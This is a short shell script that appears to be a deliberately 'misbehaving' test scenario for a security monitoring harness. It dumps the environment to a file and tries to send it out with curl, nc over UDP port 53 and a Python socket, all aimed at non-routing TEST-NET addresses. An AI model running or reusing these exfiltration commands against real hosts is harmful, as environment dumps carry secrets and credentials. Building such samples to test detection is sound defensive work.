# Misbehaving: dumps its environment and tries to send it out. Targets are
# TEST-NET addresses that route nowhere; the dump stays in the workspace.
N="$GLOVE_SCENARIO_NONCE"
ls >/dev/null
( /usr/bin/touch "/glove-onset-$N" ) 2>/dev/null
env > "env-$N.txt"
( curl -s -m 2 --data-binary "@env-$N.txt" https://192.0.2.21/collect ) >/dev/null 2>&1
( /usr/bin/nc -u -w 1 192.0.2.21 53 < "env-$N.txt" ) >/dev/null 2>&1
( python3 -c 'import socket
s = socket.socket(); s.settimeout(1)
try:
    s.connect(("192.0.2.22", 8443))
except OSError:
    pass' ) >/dev/null 2>&1
